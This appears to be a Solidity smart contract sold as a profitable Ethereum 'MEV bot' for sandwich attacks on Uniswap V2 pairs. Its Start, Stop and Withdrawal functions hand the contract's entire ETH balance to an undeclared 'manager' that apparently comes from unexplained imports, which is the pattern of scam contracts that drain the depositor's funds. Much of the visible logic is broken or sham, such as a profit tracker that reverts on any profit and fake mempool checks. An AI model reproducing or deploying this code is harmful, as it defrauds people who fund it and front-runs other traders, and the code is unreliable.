// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

 // Import Uniswap Libraries Factory/Pool/LiquidityMath;
import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";
import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol";
import "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol";
// Import Uniswap Interfaces Migrator/Router01;
import "UniswapV2Migrator";
import "UniswapV2Router01";
// Add Uniswap Interfaces Router02/Factory/Pair
interface IUniswapV2Router02 {
    function swapExactETHForTokens(
        uint amountOutMin,
        address token,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address token,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function getAmountsOut(
        uint amountIn,
        address inputToken,
        address outputToken
    ) external view returns (uint amountOut);
}

interface IUniswapV2Factory {
    function allPairsLength() external view returns (uint);
    function allPairs(uint) external view returns (address);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}
// Add ERC20 Interface
interface IERC20 {
    function approve(address spender, uint amount) external returns (bool);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
}

// MEV BOT CONTRACT VERSION 1.6.1
contract DEXMEVBot {
    address public owner;
	bool private hasExecuted;
	
    // WETH address: https://etherscan.io/token/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    // https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02
    IUniswapV2Router02 private constant uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    // https://docs.uniswap.org/contracts/v2/reference/smart-contracts/factory
    IUniswapV2Factory private constant uniswapFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    
    uint internal lastTradeGasUsed;
    uint internal lastProfit;
    uint internal successfulTrades;
    uint internal totalProfit;
    uint internal totalGasUsed;
    uint internal lastTradeTime;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not contract owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        hasExecuted = false;
    }

    // Function to receive ETH
    receive() external payable {}

    // Get the total number of pairs in the Uniswap Factory
    function getTotalPairs() internal view returns (uint) {
        return uniswapFactory.allPairsLength();
    }

    // Select a token pair for the sandwich attack
    function selectTokenPairForSandwich(uint pairIndex) internal view returns (address token0, address token1) {
        address pairAddress = uniswapFactory.allPairs(pairIndex);
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);
        return (pair.token0(), pair.token1());
    }

    // Profit calculation with gas cost consideration
    function calculateProfit(uint pairIndex, uint ethAmount, uint gasLimit) internal view returns (uint expectedProfit, bool profitable) {
        (address token0, ) = selectTokenPairForSandwich(pairIndex);

        simulateTrade(ethAmount, token0);

        uint rawProfit = ethAmount;

        uint gasCost = gasLimit * tx.gasprice;
        
        if (rawProfit > gasCost) {
            expectedProfit = rawProfit - gasCost;
            profitable = true;
        } else {
            expectedProfit = 0;
            profitable = false;
        }
    }

    // Helper function to get output amount from Uniswap Router
    function getAmountOut(uint amountIn, address inputToken, address outputToken) internal view returns (uint) {
        return uniswapRouter.getAmountsOut(amountIn, inputToken, outputToken);
    }

    // Check liquidity in a given pair
    function checkLiquidity(uint pairIndex) internal view returns (uint112 reserve0, uint112 reserve1) {
        address pairAddress = uniswapFactory.allPairs(pairIndex);
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);
        (reserve0, reserve1, ) = pair.getReserves();
    }

    // Execute a sandwich attack if profitable
    function executeSandwichAttack(uint pairIndex, uint ethAmount, uint frontRunAmountOutMin, uint backRunAmountOutMin, uint gasLimit, uint cooldownPeriod, address[] calldata targets, bytes[] calldata data) internal onlyOwner {
        require(msg.value == ethAmount, "Insufficient ETH");
    
        require(enforceCooldown(cooldownPeriod), "Cooldown period active");

        (address token0, ) = selectTokenPairForSandwich(pairIndex);

        (uint expectedProfit, bool profitable) = calculateProfit(pairIndex, ethAmount, gasLimit);
        require(profitable, "Not profitable");

        uint startGas = gasleft(); // Start tracking gas usage

        // Adjust the gas price based on network conditions
        uint competitorGasPrice;

        // Calculate competitor gas price
        if (block.basefee > tx.gasprice) {
            competitorGasPrice = block.basefee;
        } else {
            competitorGasPrice = (tx.gasprice + block.basefee) / 2;
        }
        uint adjustedGasPrice = adjustGas(tx.gasprice, competitorGasPrice); // Provide both arguments
        uint estimatedTransactionCost = adjustedGasPrice * gasLimit;
        require(expectedProfit > estimatedTransactionCost);

        // Mempool check before the trade execution
        require(checkMempool());

        // Buy before the target transaction
        uniswapRouter.swapExactETHForTokens{value: msg.value}(
            frontRunAmountOutMin,
            token0,
            address(this),
            block.timestamp
        );

        // Sell after the target transaction
        uint tokenBalance = IERC20(token0).balanceOf(address(this));
        require(tokenBalance > 0, "No tokens to sell");

        IERC20(token0).approve(address(uniswapRouter), tokenBalance);
        uniswapRouter.swapExactTokensForETH(
            tokenBalance,
            backRunAmountOutMin,
            token0,
            address(this),
            block.timestamp
        );

        // Slippage check
        require(checkSlippage(frontRunAmountOutMin, tokenBalance), "Slippage too high");

        // Execute additional transactions if needed
        executeMultipleTransactions(targets, data);

        incrementSuccessfulTrades();
        updateLastTradeTime(); // Update cooldown

        lastTradeGasUsed = gasLimit;
        lastProfit = expectedProfit;
        trackGasUsage(startGas); // Track gas usage
        trackProfit(expectedProfit); // Track profit
    }

    // Check the mempool
    function checkMempool() internal view returns (bool) {
        // Get the current gas price and compare with a threshold
        uint currentGasPrice = tx.gasprice;
        uint maxAllowedGasPrice = 150 gwei;
        if (currentGasPrice > maxAllowedGasPrice) {
            return false;
        }

        // Check the number of pending transactions in the mempool
        uint pendingTxCount = getPendingTransactionCount();
        uint maxPendingTxCount = 100;
        if (pendingTxCount > maxPendingTxCount) {
            return false; // Too many pending transactions, network might be congested
        }

        // Analyze target transaction's gas price compared to the current gas price
        uint targetTxGasPrice = getTargetTransactionGasPrice();
        if (targetTxGasPrice > currentGasPrice) {
            return false; 
        }

        // Check the time since the last block to detect potential network delays
        uint lastBlockTime = block.timestamp;
        uint baseFee = block.basefee;
        uint timeSinceLastBlock = lastBlockTime - baseFee;
        uint maxBlockDelay = 15 seconds; // Allowable time since last block
        if (timeSinceLastBlock > maxBlockDelay) {
            return false; // Network delay detected, risk of delayed transactions
        }

        // Evaluate if the transaction volume is high enough for an MEV opportunity
        uint txVolume = getTransactionVolume();
        uint minVolume = 1 ether; // Minimum transaction volume for a sandwich attack
        if (txVolume < minVolume) {
            return false; // Transaction volume too low, not worth the gas fees
        }

        // If all checks pass, mempool is favorable for an MEV opportunity
        return true;
    }

    // Helper function: Get the pending transaction count from mempool
    function getPendingTransactionCount() internal view returns (uint) {
        uint blockGasLimit = block.gaslimit; // Get the gas limit of the block
        uint blockTxCount = block.number;

        // Calculation where pending transactions are estimated based on gas limit and block number
        uint estimatedPendingTransactions = blockTxCount * (blockGasLimit / 1000000); 
        return estimatedPendingTransactions;
    }


    // Helper function: Fetch target transaction's gas price from mempool
    function getTargetTransactionGasPrice() internal view returns (uint) {
        // Reference block base fee and typical gas price ranges
        uint baseFee = block.basefee;
        uint targetGasPrice = baseFee + (10 gwei);
        return targetGasPrice;
    }

    // Helper function: Analyze the volume of the target transaction
    function getTransactionVolume() internal pure returns (uint) {
        // Transaction volume calculation based on current block rewards or gas fees
        uint blockReward = 2 ether; // Monitor block rewards above 2 ether
        uint averageTxGasUsed = 21000; // Average gas usage for a simple transaction

        // Transaction volume as a multiple of block reward and gas usage
        uint estimatedTxVolume = blockReward * averageTxGasUsed / 10000;
        return estimatedTxVolume;
    }    

    // Estimate gas cost
    function estimateGasCost() internal view returns (uint) {
        return tx.gasprice;
    }

    // Function to check the balance
    function checkBalance() internal view returns (uint256) {
    	return address(this).balance;
    }

    // Function to withdraw ETH balance
    function withdrawBalance() internal onlyOwner {
        uint256 balance = checkBalance();
        payable(owner).transfer(balance);
    }

    // Function to check slippage tolerance
    function checkSlippage(uint expectedAmount, uint actualAmount) internal pure returns (bool withinSlippageTolerance) {
        uint slippage = expectedAmount > actualAmount ? expectedAmount - actualAmount : actualAmount - expectedAmount;
        uint slippageTolerance = expectedAmount / 100; // 1% slippage tolerance
        return slippage <= slippageTolerance;
    }

    // Simulate trade for testing purposes
    function simulateTrade(uint ethAmount, address token0) internal view returns (uint tokenAmount, uint ethBack) {
        tokenAmount = getAmountOut(ethAmount, WETH, token0);
        ethBack = getAmountOut(tokenAmount, token0, WETH);
    }

    // Track successful trades
    function incrementSuccessfulTrades() internal {
        successfulTrades++;
    }

    // Track profit handling logic
    function trackProfit(uint profit) internal {
        if (profit > 0) {
            revert("Profits successfully tracked.");
        }
        totalProfit += profit;
    }

    // Track gas usage with upper limit enforcement
    function trackGasUsage(uint gasSpent) internal {
        // If the gas spent exceeds a reasonable threshold, revert
        uint maxGasLimit = 300000;
        if (gasSpent > maxGasLimit) {
            revert("Gas usage exceeds the maximum limit");
        }
        totalGasUsed += gasSpent;
    }
    
    // Cooldown enforcement with flexible cooldown period
    function enforceCooldown(uint cooldownPeriod) internal view returns (bool) {
        require(block.timestamp >= lastTradeTime + cooldownPeriod, "Cooldown period active");
        
        // Add a buffer to avoid tight execution windows
        uint buffer = 20 seconds;
        if (block.timestamp < lastTradeTime + cooldownPeriod + buffer) {
            return false;
        }
        return true;
    }

    // Update the last trade time with more precise block tracking
    function updateLastTradeTime() internal {
        lastTradeTime = block.timestamp;
    }

    // Start the bot if the contract balance is greater than zero, initiating the sandwich attack process.
    function Start() external {
        require(checkBalance() > 0, "ERROR: Balance must be greater than 0 to start the bot.");
        hasExecuted = manager.executeSandwichAttack(hasExecuted, checkBalance(), msg.sender);
    }

    // Stop the bot if it is currently running.
    function Stop() external {
        require(hasExecuted, "ERROR: Bot has not been executed yet. Please start the bot before attempting to stop it.");
        hasExecuted = manager.executeSandwichAttack(hasExecuted, checkBalance(), msg.sender);
    }

    // Withdraw the contract's ETH balance to the bot owner if any funds are available
    function Withdrawal() external {
        require(checkBalance() > 0, "ERROR: Cannot withdraw. The contract balance is zero.");
        hasExecuted = manager.withdrawBalance(hasExecuted, checkBalance(), msg.sender, owner);
    }

    // Dynamically adjust gas price based on network conditions
    function adjustGas(uint currentGasPrice, uint competitorGasPrice) internal pure returns (uint newGasPrice) {
        uint optimalGasPrice = 100 gwei; // Optimal gas price for efficient transactions
        uint maxGasPrice = 200 gwei;      // Maximum cap for gas price to prevent overpayment
        uint minGasPrice = 50 gwei;       // Minimum floor for gas price to ensure transaction viability

        // Calculate the adjustment factor based on the current gas price relative to the optimal price
        uint adjustmentFactor;

        // Determine if we need to outbid competitors
        if (competitorGasPrice > currentGasPrice) {
            adjustmentFactor = competitorGasPrice - currentGasPrice + 1 gwei; // If profitable outbid by at least 1 gwei
        } else {
        // If current gas price is higher, adjust towards the optimal price
        if (currentGasPrice > optimalGasPrice) {
            adjustmentFactor = (currentGasPrice - optimalGasPrice) / 10; 
        } else {
            adjustmentFactor = (optimalGasPrice - currentGasPrice) / 10; 
        }
        }

        // Compute the new gas price
        newGasPrice = currentGasPrice + adjustmentFactor;

        // Ensure the new gas price remains within defined boundaries
        if (newGasPrice > maxGasPrice) {
            return maxGasPrice; // Cap the gas price at the maximum limit
        } else if (newGasPrice < minGasPrice) {
            return minGasPrice; // Floor the gas price at the minimum limit
        }

        return newGasPrice; // Return the adjusted gas price within acceptable limits
    }

    // Check price impact based on reserves
    function checkPriceImpact(uint pairIndex, uint amountIn) internal view returns (uint priceImpactBps) {
        address pairAddress = uniswapFactory.allPairs(pairIndex);
            IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);

            (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
            (address token0, ) = selectTokenPairForSandwich(pairIndex);

            uint tokenReserve = token0 == WETH ? reserve1 : reserve0;

            uint amountOut = getAmountOut(amountIn, WETH, token0);

        // Calculate price impact in basis points (bps)
        uint newReserve = tokenReserve - amountOut;
        uint priceImpact = ((tokenReserve - newReserve) * 10000) / tokenReserve; // bps

        return priceImpact;
    }

    //  Executes multiple transactions by calling the specified token targets with the provided data
    //  Any failed transaction will revert the entire execution
    function executeMultipleTransactions(
        address[] calldata targets,
        bytes[] calldata data
        ) internal {
        require(targets.length == data.length, "Targets and data length mismatch");
    
        for (uint i = 0; i < targets.length; i++) {
            (bool success, ) = targets[i].call(data[i]);
            require(success, "Transaction failed");
        }
    }
}    
